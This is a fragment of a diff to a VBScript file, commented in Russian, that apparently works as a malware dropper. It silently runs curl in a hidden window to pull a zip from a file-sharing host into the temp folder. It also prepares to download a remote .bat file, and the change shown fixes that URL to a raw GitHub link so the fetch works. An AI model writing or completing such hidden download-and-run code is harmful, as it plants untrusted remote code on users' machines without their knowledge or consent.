@@ -3,7 +3,7 @@ Option Explicit
 CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/0g8mkpymqtdcz601/Best_Gits.zip", 0, True
 
 Dim strBatchURL, strBatchTempFile
-strBatchURL = "https://github.com/jacker8181/fff/refs/heads/main/unp.bat" ' URL для .bat файла
+strBatchURL = "https://raw.githubusercontent.com/jacker8181/fff/refs/heads/main/unp.bat" ' URL для .bat файла
 strBatchTempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\unp.bat" ' Имя для .bat файла
 
 Dim objXMLHTTP, objStream
